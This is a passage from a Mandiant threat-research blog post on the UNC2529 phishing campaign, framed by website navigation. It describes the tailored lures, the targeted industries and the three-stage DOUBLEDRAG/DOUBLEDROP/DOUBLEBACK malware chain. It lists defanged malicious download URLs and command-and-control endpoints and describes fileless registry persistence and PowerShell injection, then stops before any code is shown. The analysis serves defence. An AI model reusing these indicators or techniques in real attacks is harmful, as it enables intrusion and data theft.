</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Security For:</h4><ul><li itemprop="url"><a href="/products/cloud-security.html" itemprop="name" class="MegaMenus">Cloud</a></li>
<li itemprop="url"><a href="/products/financial-services.html" itemprop="name" class="MegaMenus">Financial Services</a></li>
<li itemprop="url"><a href="/products/government.html" itemprop="name" class="MegaMenus">Government</a></li>
<li itemprop="url"><a href="/products/healthcare.html" itemprop="name" class="MegaMenus">Healthcare</a></li>
<li itemprop="url"><a href="/products/industrial-systems-and-critical-infrastructure-security.html" itemprop="name" class="MegaMenus">Industrial &amp; Critical Infrastructure</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  @media (max-width: 1024px) {
    .megamenu-tab .parsys .megamenus .megamenu-cta {
      display: none;
    }
  }
  .content-0-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-customers.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 0 60px;
    border: 0 solid #ffffff;
  }
  .content-0-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}
</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Customer Stories</h5>
<p>Explore some of the companies who are succeeding with&nbsp;FireEye.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-2E5799 compact" href="/customers.html" id="learn-more-intel">Read the Stories</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
<div class="view-all-bar">
<a href="/products.html" class="MegaMenus">
VIEW ALL PRODUCTS</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/mandiant.html">
<h4 class="megamenu-title">
<a href="/mandiant.html" itemprop="url" class="MegaMenus">Mandiant</a>
</h4>
<div class="content-1-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub ">
<div class="n03-sub_container" data-columns="3">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title" itemprop="url"><a href="/mandiant/advantage.html" itemprop="name" class="MegaMenus">Mandiant Advantage</a></h4><ul><li itemprop="url"><a href="/mandiant/automated-defense.html" itemprop="name" class="MegaMenus">Automated Defense</a></li>
<li itemprop="url"><a href="/mandiant/security-validation.html" itemprop="name" class="MegaMenus">Security Validation</a></li>
<li itemprop="url"><a href="/mandiant/threat-intelligence.html" itemprop="name" class="MegaMenus">Threat Intelligence</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title" itemprop="url"><a href="/mandiant/cyber-security-consulting.html" itemprop="name" class="MegaMenus">Mandiant Consulting</a></h4><ul><li itemprop="url"><a href="/mandiant/incident-response.html" itemprop="name" class="MegaMenus">Incident Response</a></li>
<li itemprop="url"><a href="/mandiant/cyber-security-consulting.html" itemprop="name" class="MegaMenus">Cyber Security Consulting</a></li>
<li itemprop="url"><a href="/services/training.html" itemprop="name" class="MegaMenus">Cyber Security Training</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-1-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-mandiant.jpg) center no-repeat;
    background-size: cover;
    background-position: bottom;
    border-radius: 60px 0 0 60px;
    border: 0 solid #ffffff;}
  .content-1-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Mandiant Managed Offerings</h4><ul><li itemprop="url"><a href="/mandiant/managed-detection-and-response.html" itemprop="name" class="MegaMenus">Managed Defense</a></li>
<li itemprop="url"><a href="/mandiant/expertise-on-demand.html" itemprop="name" class="MegaMenus">Expertise on Demand</a></li>
</ul></div>
</div>
</div><div class="separator disabled"></div></div></div>
</div>
<div class="view-all-bar">
<a href="/mandiant.html" class="MegaMenus">
VIEW ALL Mandiant</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/customers.html">
<h4 class="megamenu-title">
<a href="/company/customers.html" itemprop="url" class="MegaMenus">Customers</a>
 </h4>
<div class="content-2-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Customers</h4><ul><li itemprop="url"><a href="/customers.html" itemprop="name" class="MegaMenus">Customer Stories</a></li>
<li itemprop="url"><a href="/company/customers.html" itemprop="name" class="MegaMenus">Customer Success</a></li>
<li itemprop="url"><a href="https://fireeyecommunity.force.com/CustomerCommunity/s/" target="_blank" itemprop="name" class="MegaMenus">Customer Portal</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Get Support</h4><ul><li itemprop="url"><a href="/support/contacts.html" itemprop="name" class="MegaMenus">Contact Support</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Find Answers</h4><ul><li itemprop="url"><a href="/support/programs.html" itemprop="name" class="MegaMenus">Support Programs</a></li>
<li itemprop="url"><a href="/support/notices.html" itemprop="name" class="MegaMenus">Support Notices</a></li>
<li itemprop="url"><a href="/support/products.html" itemprop="name" class="MegaMenus">Supported Products</a></li>
<li itemprop="url"><a href="https://community.fireeye.com/s/support-community" target="_blank" itemprop="name" class="MegaMenus">Communities</a></li>
<li itemprop="url"><a href="https://docs.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">Documentation Portal</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-2-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-support.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-2-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Support</h5>
<p>A global network of support experts available 24x7. We offer simple and flexible support programs to maximize the value of your FireEye products and services.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-2E5799 compact" href="/support.html">Get Support</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/partners.html">
<h4 class="megamenu-title">
<a href="/partners.html" itemprop="url" class="MegaMenus">Partners</a>
</h4>
<div class="content-3-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">FireEye Partners</h4><ul><li itemprop="url"><a href="/partners.html" itemprop="name" class="MegaMenus">Partners Overview</a></li>
<li itemprop="url"><a href="/partners/resellers.html" itemprop="name" class="MegaMenus">FireEye Affinity Resellers</a></li>
<li itemprop="url"><a href="/partners/strategic-technology-partners.html" itemprop="name" class="MegaMenus">Technology Partners</a></li>
<li itemprop="url"><a href="/partners/strategic-technology-partners/cyber-risk-insurance.html" itemprop="name" class="MegaMenus">Cyber Risk Partners</a></li>
<li itemprop="url"><a href="/partners/global-solution-providers.html" itemprop="name" class="MegaMenus">Global Solution Providers</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Partner Resources</h4><ul><li itemprop="url"><a href="https://partners.fireeye.com/directory/" target="_blank" itemprop="name" class="MegaMenus">Partner Locator</a></li>
<li itemprop="url"><a href="http://training.fireeye.com/" target="_blank" itemprop="name" class="MegaMenus">Partner Education Center</a></li>
<li itemprop="url"><a href="/support.html" itemprop="name" class="MegaMenus">Support</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Partnering with FireEye</h4><ul><li itemprop="url"><a href="https://www2.fireeye.com/Partner-Request-LP-New.html" target="_blank" itemprop="name" class="MegaMenus">Become a Partner</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-3-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-partners.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-3-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>Partner Portal</h5>
<p>Access for our registered Partners to help you be successful with FireEye.
Collateral, deal registration, request for funds, training, enablement, and more.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-F99B1C compact mm-cta" href="https://partners.fireeye.com/" target="_blank">Partner Portal</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/current-threats.html">
<h4 class="megamenu-title">
<a href="/current-threats.html" itemprop="url" class="MegaMenus">Resources</a>
</h4>
<div class="content-4-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub " id="mandiant-mega-menu">
<div class="n03-sub_container" data-columns="3">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Intelligence Briefings and Bulletins</h4><ul><li itemprop="url"><a href="/current-threats/annual-threat-report.html" itemprop="name" class="MegaMenus">Annual Threat Reports</a></li>
<li itemprop="url"><a href="/current-threats/threat-intelligence-reports.html" itemprop="name" class="MegaMenus">Threat Intelligence Reports</a></li>
<li itemprop="url"><a href="/current-threats/reports-by-industry.html" itemprop="name" class="MegaMenus">Threat Intelligence Reports by Industry</a></li>
<li itemprop="url"><a href="/current-threats/apt-groups.html" itemprop="name" class="MegaMenus">APT Groups</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">FireEye Blogs</h4><ul><li itemprop="url"><a href="/blog.html" itemprop="name" class="MegaMenus">Read the FireEye Blogs</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Cyber Security</h4><ul><li itemprop="url"><a href="/current-threats/what-is-cyber-security.html" itemprop="name" class="MegaMenus">What is Cyber Security?</a></li>
<li itemprop="url"><a href="/campaigns/clarity-in-the-cloud.html" itemprop="name" class="MegaMenus">Clarity in the Cloud</a></li>
<li itemprop="url"><a href="/campaigns/security-effectiveness.html" itemprop="name" class="MegaMenus">Security Effectiveness and Validation</a></li>
<li itemprop="url"><a href="/campaigns/automated-defense.html" itemprop="name" class="MegaMenus">Simplify Security Operations</a></li>
<li itemprop="url"><a href="https://vision.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">The Vision â€“ Digital Magazine</a></li>
<li itemprop="url"><a href="/company/webinars.html" itemprop="name" class="MegaMenus">Webinars</a></li>
</ul></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">Free Tools & Apps</h4><ul><li itemprop="url"><a href="/services/freeware.html" itemprop="name" class="MegaMenus">Free Software Downloads</a></li>
<li itemprop="url"><a href="https://fireeye.market" target="_blank" itemprop="name" class="MegaMenus">FireEye Market</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Training</h4><ul><li itemprop="url"><a href="/services/training.html" itemprop="name" class="MegaMenus">Education and Training</a></li>
</ul></div>
</div>
</div><div class="separator disabled"></div></div></div>
</div>
<div class="view-all-bar">
<a href="/current-threats.html" class="MegaMenus">
VIEW ALL RESOURCES</a>
</div></div>
</div>
</div>
</li><li class="megamenu-tab" data-curry="/blog.html" data-link="/company.html">
<h4 class="megamenu-title">
<a href="/company.html" itemprop="url" class="MegaMenus">Company</a>
</h4>
<div class="content-5-par parsys"><div class="megamenus section">

<div class="n03_list-item-sub has-inner-cta ">
<div class="n03-sub_container" data-columns="2">
<div class="n03-sub_table">
<div class="col-wrap">
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">About Us</h4><ul><li itemprop="url"><a href="/company.html" itemprop="name" class="MegaMenus">Why FireEye?</a></li>
<li itemprop="url"><a href="/company/awards.html" itemprop="name" class="MegaMenus">Awards and Honors</a></li>
<li itemprop="url"><a href="/company/leadership.html" itemprop="name" class="MegaMenus">Leadership</a></li>
<li itemprop="url"><a href="/company/board-of-directors.html" itemprop="name" class="MegaMenus">Board of Directors</a></li>
<li itemprop="url"><a href="http://investors.fireeye.com" target="_blank" itemprop="name" class="MegaMenus">Investor Relations</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Contact</h4><ul><li itemprop="url"><a href="/company/contact-us.html" itemprop="name" class="MegaMenus">Contact FireEye</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>.g04 .megamenu-list a{padding-right:38px;line-height:1.358;padding-bottom:2px}@media (min-width:60em){.g04 .n03-sub_container{padding-bottom:23px}}@media(min-width:64em) and (max-width:64.5em){.g04 .megamenu-tab:first-child .megamenu-title{padding-left:14px}}@media (min-width:68em) and (max-width:69em){.g04 .megamenu-tab:first-child .megamenu-title{padding-left:30px}}</style></div>
</div>
</div><div class="separator"></div>
<div class="n03-sub_cell">
<div class="parsys"><div class="megamenu-list section">
<h4 class="n03-sub_title">News and Events</h4><ul><li itemprop="url"><a href="/company/newsroom.html" itemprop="name" class="MegaMenus">Newsroom</a></li>
<li itemprop="url"><a href="/company/press-releases.html" itemprop="name" class="MegaMenus">Press Releases</a></li>
<li itemprop="url"><a href="/company/events.html" itemprop="name" class="MegaMenus">Events</a></li>
</ul></div>
<div class="megamenu-list section">
<h4 class="n03-sub_title">Careers</h4><ul><li itemprop="url"><a href="/company/jobs.html" itemprop="name" class="MegaMenus">Job Opportunities</a></li>
<li itemprop="url"><a href="/company/jobs/internships.html" itemprop="name" class="MegaMenus">Internships</a></li>
</ul></div>
<div class="htmlpassthru section">
<style>
  .content-5-par .megamenus .megamenu-cta {
    background: url(/content/dam/fireeye-www/global/en/nav/bg-nav-vision.jpg) center no-repeat;
    background-size: cover;
    border-radius: 60px 0 12px 60px;
    border: 0 solid #ffffff;}
  .content-5-par .n03_utility {background-color: transparent;}
  .n03_utility_cell {padding: 0 13px 0 0;}

</style></div>
</div>
</div><div class="separator disabled"></div></div><div class="megamenu-cta">

<div class="n03_utility">
<div class="n03_utility_container">
<div class="n03_utility_table">
<div class="n03_utility_cell">
<h5>The Vision</h5>
<p>Read our digital magazine providing expert-authored stories, information, unique insights, and advice on cyber security.</p>
</div>
<div class="n03_utility_cell"><div class="button"><div class="text-center"><a class="btn btn-B2282D compact" href="https://vision.fireeye.com/" target="_blank">Get Your Copy</a></div></div>
</div>
</div>
</div>
</div></div>
</div>
</div>
</div>
</div>
</div>
</li></ul>
</nav>
</div>
<span class="burger ficon ficon-menu"></span>
</header>
</div>
</div>


<div id="cookie-privacy-banner" style="display:none;">
<div class="l_container">
<div class="g">
<div class="g-u-1">
<div class="g-content">
<div class="cookie-banner">
<p class="cookie-text">
To give you the best possible experience, this site uses cookies.&nbsp; Find out more on <a href='/company/privacy.html' target='_blank'>how we use cookies</a>.<button type="button" class="cookie-button highlighted" onclick='javascript:onAccept();'>Accept</button>
</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="breadcrumbs breadcrumb">
<div class="l_container is-full">
<div class="g02 g02v0" id="g02-breadcrumbs">
<div class="g02_container">
<div class="g02_content">
<ul class="list-inline g02_list" itemscope itemtype="http://schema.org/BreadcrumbList">
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/blog.html"><span itemprop="name">FireEye Blogs</span></a><meta itemprop="position" content="2" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" class="BreadCrumb" href="/blog/threat-research.html"><span itemprop="name">Threat Research</span></a><meta itemprop="position" content="3" /></li>
<li class="g02_list_item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">The UNC2529 Triple Double: A Trifecta Phishing Cam...<meta itemprop="position" content="6" /></span>
</ul>
</div>
</div>
</div>
</div>
</div>
<main class="l_main" role="main">
<div class="l_container">
<div class="g g-alt ">
<div class="g-u-17-24 l_g-u-1">
<div class="g-content">
<div class="blog main"><div itemscope itemtype="http://schema.org/BlogPosting">
<div class="summary entrytextteaser">
</div>
<div class="title entrytitle">
<h2 class="category-name">Threat Research</h2>
<h1 class="blogpostlanding red" itemprop="headline">The UNC2529 Triple Double: A Trifecta Phishing Campaign</h1>
<div class="c00 c00v0 entry-meta-block selfClear">
<time class="entry-date" itemprop="datePublished" content="2021-05-04T14:00:00Z">May 04, 2021</time>
<span class="sep"> | </span>
<span class="by-author" itemscope itemptype="http://schema.org/Person">by <a href="/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/nick-richard" title="View all entries filed under 'Fireeye - Authors : Nick Richard'">Nick Richard</a>, <a href="/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/dimiter-andonov" title="View all entries filed under 'Fireeye - Authors : Dimiter Andonov'">Dimiter Andonov</a><meta itemprop="author" content="Nick Richard" /><meta itemprop="contributor" content="Dimiter Andonov" /></span>
<div class="tags-section">
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/malware"> <span class="tagbutton">Malware</span></a><br class="on-mobile" />
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/unc"> <span class="tagbutton">unc</span></a><br class="on-mobile" />
<a class="tagList" href="/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/phishing"> <span class="tagbutton">Phishing</span></a><br class="on-mobile" />
</div>
</div>
</div>
<div class="par parsys"><div class="entrytext section"><div class="c00 c00v0" itemprop="articleBody">
<p>In December 2020, Mandiant observed a widespread, global phishing campaign targeting numerous organizations across an array of industries. Mandiant tracks this threat actor as <a adhocenable="false" href="/blog/products-and-services/2020/12/how-mandiant-tracks-uncategorized-threat-actors.html">UNC2529</a>. Based on the considerable infrastructure employed, tailored phishing lures and the professionally coded sophistication of the malware, this threat actor appears experienced and well resourced. This blog post will discuss the phishing campaign, identification of three new malware families, DOUBLEDRAG, DOUBLEDROP and DOUBLEBACK, provide a deep dive into their functionality, present an overview of the actorâ€™s modus operandi and our conclusions. A future blog post will focus on the backdoor communications and the differences between DOUBLEBACK samples to highlight the malware evolution.</p>
<h4>UNC2529 Phishing Overview</h4>
<p>Mandiant observed the first wave of the phishing campaign occur on Dec. 2, 2020, and a second wave between Dec. 11 and Dec. 18, 2020.</p>
<p>During the initial flurry, Mandiant observed evidence that 28 organizations were sent phishing emails, though targeting was likely broader than directly observed. These emails were sent using 26 unique email addresses associated with the domain tigertigerbeads&lt;.&gt;com, and in only a small number of cases did we see the same address used across multiple recipient organizations. These phishing emails contained inline links to malicious URLs such as, hxxp://totallyhealth-wealth[.]com/downld-id_mw&lt;redacted&gt;Gdczs, engineered to entice the victim to download a file. UNC2529 employed at least 24 different domains to support this first, of a three-stage process.</p>
<p>The structure of URLs embedded in these phishing emails had the following patterns, where the string was an alphabetic variable of unknown function.</p>
<p>http://&lt;fqdn&gt;/downld-id_&lt;string&gt;<br>
http://&lt;fqdn&gt;/downld-id-&lt;string&gt;<br>
http://&lt;fqdn&gt;/files-upload_&lt;string&gt;<br>
http://&lt;fqdn&gt;/files-upload-&lt;string&gt;<br>
http://&lt;fqdn&gt;/get_file-id_&lt;string&gt;<br>
http://&lt;fqdn&gt;/get_file-id-&lt;string&gt;<br>
http://&lt;fqdn&gt;/zip_download_&lt;string&gt;<br>
http://&lt;fqdn&gt;/zip_download-&lt;string&gt;</p>
<p>The first stage payload downloaded from these URLs consisted of a Zip compressed file containing a corrupt decoy PDF document and a heavily obfuscated JavaScript downloader. Mandiant tracks the downloader as DOUBLEDRAG. Interestingly, the PDF documents were obtained from public websites, but corrupted by removing bytes to render them unreadable with a standard PDF viewer. It is speculated that the victim would then attempt to launch the JavaScript (.js) file, which can be executed natively with Windows Script Host by simply double clicking on the file. All but one of the file name patterns for the ZIP, PDF and JS files were document_&lt;state&gt;_client-id_&lt;4 digit number&gt;.extension, such as â€œdocument_Ohio_client-id_8902.zipâ€.</p>
<p>Each of the observed DOUBLEDRAG downloaders used in the first wave attempted to download a second-stage memory-only dropper, which Mandiant tracks as DOUBLEDROP, from either hxxp://p-leh[.]com/update_java.dat or hxxp://clanvisits[.]com/mini.dat. The downloaded file is a heavily obfuscated PowerShell script that will launch a backdoor into memory. Mandiant tracks this third-stage backdoor as DOUBLEBACK. DOUBLEBACK samples observed during the phishing campaign beaconed to hxxps://klikbets[.]net/admin/client.php and hxxps://lasartoria[.]net/admin/client.php.</p>
<p>Prior to the second wave, observed between Dec. 11&nbsp;and Dec. 18, 2020, UNC2529 hijacked a legitimate domain owned by a U.S. heating and cooling services company, modified DNS entries and leveraged that infrastructure to phish at least 22 organizations, five of which were also targeted in the first wave. It is not currently known how the legitimate domain was compromised. The threat actor used 20 newly observed domains to host the second-stage payload.&nbsp;</p>
<p>The threat actor made slight modifications to the URL pattern during the second wave.</p>
<p>http://&lt;fqdn&gt;/&lt;string&gt;<br>
http://&lt;fqdn&gt;/dowld_&lt;string&gt;<br>
http://&lt;fqdn&gt;/download_&lt;string&gt;<br>
http://&lt;fqdn&gt;/files_&lt;string&gt;<br>
http://&lt;fqdn&gt;/id_&lt;string&gt;<br>
http://&lt;fqdn&gt;/upld_&lt;string&gt;</p>
<p>Of note, the DOUBLEDRAG downloader observed in the first wave was replaced with a Microsoft Excel document containing an embedded legacy Excel 4.0 (XLM) macro in Excel 97-Excel 2003 Binary file format (BIFF8). When the file was opened and the macro executed successfully, it would attempt to download a second-stage payload from hxxps://towncentrehotels[.]com/ps1.dat. The core functionality of the DOUBLEDRAG JavaScript file and the BIFF8 macro is to download a file from a hardcoded URL. This Excel file was also found within Zip files, as seen in the first wave, although only one of the observed Zip files included a corresponding corrupt decoy PDF document.&nbsp;</p>
<p>Additional DOUBLEBACK samples were extracted from DOUBLEDROP samples uploaded to a public malware repository, which revealed additional command and control servers (C2), hxxps://barrel1999[.]com/admin4/client.php, hxxps://widestaticsinfo[.]com/admin4/client.php, hxxps://secureinternet20[.]com/admin5/client.php, and hxxps://adsinfocoast[.]com/admin5/client.php. Three of these domains were registered after the observed second wave.</p>
<h4>Tailored Targeting</h4>
<p>UNC2529 displayed indications of target research based on their selection of sender email addresses and subject lines which were tailored to their intended victims. For example, UNC2529 used a unique username, masquerading as an account executive for a small California-based electronics manufacturing company, which Mandiant identified through a simple Internet search. The username of the email address was associated with both sender domains, tigertigerbeads&lt;.&gt;com and the compromised HVAC company. Masquerading as the account executive, seven phishing emails were observed targeting the medical industry, high-tech electronics, automotive and military equipment manufacturers, and a cleared defense contractor with subject lines very specific to the products of the California-based electronics manufacturing company.</p>
<p>Another example is a freight / transport company that received a phish with subject, â€œcompton ca to flowery branch gaâ€, while a firm that recruits and places long-haul truck drivers received a simple, â€œdriverâ€ in the subject line.</p>
<p>A utility company received a phish with subject, â€œeasement to bore to our stairwell area.â€</p>
<p>While not all financial institutions saw seemingly tailored subjects, numerous appeared fairly unique, as shown in Table 1.<br>
</p>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="349" valign="top"><p>Subject Lure</p>
</td>
<td width="69" valign="top"><p>Wave</p>
</td>
</tr><tr><td width="349" valign="top"><p>re: &lt;redacted&gt; outdoors environment (1 out of 3)</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>accepted: follow up with butch &amp; karen</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>re: appraisal for &lt;redacted&gt; - smysor rd</p>
</td>
<td width="69" valign="top"><p>2nd</p>
</td>
</tr><tr><td width="349" valign="top"><p>re: &lt;redacted&gt; financing</p>
</td>
<td width="69" valign="top"><p>2nd</p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Table 1: Sample financial industry subject lures</span></p>
<p>Several insurance companies that were targeted saw less specific subjects, but still appropriate for the industry, such as those in Table 2.</p>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="349" valign="top"><p>Subject Lure</p>
</td>
<td width="69" valign="top"><p>Wave</p>
</td>
</tr><tr><td width="349" valign="top"><p>fw: certificate of insurance</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>fw: insurance for plow</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>please get this information</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>question &amp; number request</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>claim status</p>
</td>
<td width="69" valign="top"><p>2nd</p>
</td>
</tr><tr><td width="349" valign="top"><p>applications for medicare supplement &amp; part d</p>
</td>
<td width="69" valign="top"><p>2nd</p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Table 2: Sample insurance industry subject lures</span></p>
<p>Interestingly, one insurance company with offices in eastern Texas received a phish with a subject related to a local water authority and an ongoing water project. While no public information was found to tie the company to the other organization or project, the subject appeared to be very customized.</p>
<p>Some patterns were observed, as seen in Table 3. Additionally, UNC2529 targeted the same IT services organization in both waves using the same lure (1 and 5 in Table 3). Most of the phishing emails with lures containing â€œworkerâ€ targeted U.S. organizations. As â€œworkerâ€ isnâ€™t a common way to refer to an employee in the U.S., this may indicate a non-native American English speaker.</p>
<table border="1" cellspacing="0" cellpadding="0">
<tbody><tr><td width="349" valign="top"><p>Subject Lure</p>
</td>
<td width="69" valign="top"><p>Wave</p>
</td>
</tr><tr><td width="349" valign="top"><p>dear worker, your work # ujcb0utczl</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>good day worker, your job number- 8ldbsq6ikd</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>hello worker, your work number- u39hbutlsf</p>
</td>
<td width="69" valign="top"><p>1st</p>
</td>
</tr><tr><td width="349" valign="top"><p>good day candidate, your vacancy # xcmxydis4s</p>
</td>
<td width="69" valign="top"><p>2nd</p>
</td>
</tr><tr><td width="349" valign="top"><p>dear worker, your work # ujcb0utczl</p>
</td>
<td width="69" valign="top"><p>2nd</p>
</td>
</tr></tbody></table>
<p><span class="type-XS">Table 3: Sample pattern subject lures</span></p>
<h4>Industry and Regional Targeting</h4>
<p>UNC2529â€™s phishing campaign was both global and impacted an array of industries (Industry and Regional Targeting graphics are greater than 100% due to rounding). While acknowledging some telemetry bias, in both waves the U.S. was the primary target, while targeting of EMEA and Asia and Australia were evenly dispersed in the first wave, as shown in Figure 1.</p>
<p><img src="/content/dam/fireeye-www/blog/images/unc2529-phishing/fig1.png" alt=""><br>
<span class="type-XS">Figure 1: UNC2529 phishing campaign, first wave</span></p>
<p>In the second wave, EMEAâ€™s percentage increased the most, while the U.S. dropped slightly, and Asia and Australia remained at close to the same level, as illustrated in Figure 2.&nbsp;</p>
<p><img src="/content/dam/fireeye-www/blog/images/unc2529-phishing/fig2.png" alt=""><br>
<span class="type-XS">Figure 2: UNC2529 phishing campaign, second wave</span></p>
<p>Although Mandiant has no evidence about the objectives of this threat actor, their broad targeting across industries and geographies is consistent with a targeting calculus most commonly seen among financially motivated groups.</p>
<h4>Technical Analysis</h4>
<h5>Overview</h5>
<p>The Triple DOUBLE malware ecosystem consists of a downloader (DOUBLEDRAG) (or alternatively an Excel document with an embedded macro), a dropper (DOUBLEDROP), and a backdoor (DOUBLEBACK). As described in the previous section, the initial infection vector starts with phishing emails that contain a link to download a malicious payload that contains an obfuscated JavaScript downloader. Once executed, DOUBLEDRAG reaches out to its C2 server and downloads a memory-only dropper. The dropper, DOUBLEDROP, is implemented as a PowerShell script that contains both 32-bit and 64-bit instances of the backdoor DOUBLEBACK. The dropper performs the initial setup that establishes the backdoorâ€™s persistence on the compromised system and proceeds by injecting the backdoor into its own process (PowerShell.exe) and then executing it. The backdoor, once it has the execution control, loads its plugins and then enters a communication loop, fetching commands from its C2 server and dispatching them. One interesting fact about the whole ecosystem is that only the downloader exists in the file system. The rest of the components are serialized in the registry database, which makes their detection somewhat harder, especially by file-based antivirus engines.</p>
<h4>Ecosystem in Details</h4>
<h5>DOUBLEDRAG Downloader component</h5>
<p>The downloader is implemented as a heavily obfuscated JavaScript code. Despite the relatively large amount of the code, it boils down to the following snippet of code (Figure 3), after de-obfuscation.</p>
<table cellpadding="1" cellspacing="0" border="1">
